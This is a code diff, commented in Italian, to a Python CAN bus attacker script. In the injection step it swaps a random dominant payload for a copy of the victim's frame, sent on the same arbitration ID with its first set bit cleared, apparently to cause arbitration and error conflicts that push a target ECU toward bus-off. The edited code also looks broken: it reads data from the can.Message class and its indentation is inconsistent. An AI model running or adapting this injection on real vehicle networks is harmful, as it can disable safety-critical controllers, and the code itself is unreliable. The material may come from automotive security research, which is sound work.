@@ -28,6 +28,15 @@ INITIAL_TEC = 0
 
 # ----------------------
 
+def flip_first_one_from_left(byte_val: int) -> int:
+    """
+    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
+    Se il byte è 0x00, lo lascia invariato.
+    """
+    for bit in range(7, -1, -1):
+        if byte_val & (1 << bit):
+            return byte_val & ~(1 << bit)
+    return byte_val
 
 
 def start_attacker_dynamic():
@@ -217,26 +226,24 @@ def start_attacker_dynamic():
         # Iniezione del messaggio malevolo (stesso ID e payload Dominante)
 
         try:
+                # Copia i dati originali
+                data = bytearray((can.Message).data)
 
-            random_data = [random.randint(0, 255) for _ in range(7)]
+                # Esempio: applichi il bit-flip al primo byte
+                # (puoi cambiare indice se ti interessa un altro byte)
+                data[0] = flip_first_one_from_left(data[0])
 
-            attack_data = [0x00] + random_data # Primo byte dominante per forzare il conflitto
+                # Crei il frame "attaccante" con stesso ID ma data corrotta
+                att_msg = can.Message(
+                arbitration_id=msg.arbitration_id,
+                data=data,
+                is_extended_id=msg.is_extended_id
+                )
 
-            
+                print(f"[ATT] vittima={msg.data.hex().upper()}  →  attaccante={att_msg.data.hex().upper()}")
+                bus.send(att_msg)
 
-            msg_attack = can.Message(
-
-                arbitration_id=TARGET_ID,
-
-                data=attack_data, 
-
-                is_extended_id=False
-
-            )
-
-            bus.send(msg_attack)
-
-            print(f"💣 [Attaccante] Messaggio malevolo iniettato.")
+        print(f"💣 [Attaccante] Messaggio malevolo iniettato.")
 
             
 
